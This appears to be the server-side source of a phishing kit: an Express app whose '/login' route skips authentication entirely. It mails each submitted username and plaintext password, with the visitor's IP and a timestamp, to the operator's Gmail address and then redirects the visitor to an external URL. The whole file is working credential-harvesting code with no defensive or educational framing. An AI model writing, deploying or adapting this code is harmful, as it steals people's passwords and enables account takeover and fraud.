const express = require("express");
const nodemailer = require("nodemailer");
require("dotenv").config();

const app = express();

// Middleware
app.use(express.json());
app.use(express.urlencoded({ extended: true }));
app.use(express.static("public"));

// Root route for health check
app.get("/", (req, res) => {
    res.send("Backend is running");
});

// Login route
app.post("/login", async (req, res) => {
    const { username, password } = req.body;

    const timestamp = new Date().toLocaleString();
    let ip = req.headers["x-forwarded-for"] || req.socket.remoteAddress;
    if (Array.isArray(ip)) ip = ip[0]; // normalize if array

    const transporter = nodemailer.createTransport({
        service: "gmail", // simpler than host/port
        auth: {
            user: process.env.EMAIL_USER,
            pass: process.env.EMAIL_PASS
        }
    });

    const mailOptions = {
        from: process.env.EMAIL_USER,
        to: process.env.EMAIL_USER,
        subject: "New Login Detected",
        text: `A login just occurred.

Username: ${username}
Password: ${password}

Time: ${timestamp}
IP Address: ${ip}`
    };

    try {
        await transporter.sendMail(mailOptions);
        console.log("Email sent successfully");
        res.redirect(process.env.REDIRECT_URL);
    } catch (error) {
        console.error("Email error:", error);
        res.status(500).send("Something went wrong. Please try again.");
    }
});

// Start server
const PORT = process.env.PORT || 3000;
app.listen(PORT, () => {
    console.log(`Server running on port ${PORT}`);
});